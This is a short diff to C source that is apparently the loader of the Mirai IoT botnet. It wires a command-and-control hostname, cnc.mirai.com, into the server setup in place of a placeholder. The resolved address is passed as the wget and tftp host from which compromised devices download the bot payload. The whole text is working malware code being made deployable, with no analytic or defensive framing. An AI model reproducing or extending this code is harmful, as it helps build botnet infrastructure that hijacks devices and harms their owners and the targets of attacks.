@@ -50,8 +50,15 @@ int main(int argc, char **args)
         return 1;
     }
 
-    /*                                                                                   wget address  tftp address */
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "{CNC}", 80, "{CNC}")) == NULL)
+    struct hostent* pHostInfo = gethostbyname("cnc.mirai.com");
+    char *cnc_addr = inet_ntoa(pHostInfo->h_addr);
+
+#ifdef DEBUG
+    printf("CNC Server IP = %s\n", cnc_addr);
+#endif
+    
+    /*                       sysconf(_SC_NPROCESSORS_ONLN)   wget address  tftp address */
+    if ((srv = server_create(1, addrs_len, addrs, 1024 * 64, cnc_addr, 80, cnc_addr)) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
